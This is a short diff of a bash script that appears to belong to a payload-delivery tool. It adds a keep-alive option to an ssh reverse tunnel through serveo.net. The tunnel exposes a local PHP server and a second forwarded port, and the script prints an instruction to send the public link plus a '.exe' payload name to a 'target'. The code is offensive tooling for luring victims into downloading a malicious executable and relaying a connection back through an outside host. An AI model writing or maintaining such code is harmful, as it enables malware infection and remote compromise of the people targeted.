@@ -52,7 +52,7 @@ exit 1; }
 }
 server() {
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
-ssh -o StrictHostKeyChecking=no -R 80:localhost:$port serveo.net -R $default_port3:localhost:$default_port2 2> /dev/null &
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net -R $default_port3:localhost:$default_port2 2> /dev/null &
 sleep 3
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the first link above to target + /%s.exe:\e[0m\e[1;77m \n' $payload_name
 php -S localhost:$port > /dev/null 2>&1 &
